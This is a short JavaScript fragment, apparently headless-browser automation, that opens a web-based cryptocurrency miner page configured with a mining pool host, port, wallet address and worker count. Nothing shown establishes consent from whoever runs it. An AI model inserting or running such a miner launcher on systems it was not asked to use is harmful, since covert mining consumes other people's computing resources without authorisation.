...
(async () => {
  ...
  await page.goto('https://webminer.pages.dev?algorithm=cwm_minotaurx&host=minotaurx.eu.mine.zpool.ca&port=7019&worker=DA5fXD1uk2u6pGCrjnwTkuuJ1BD1sAhWh&password=c%3DBBC&workers=5');
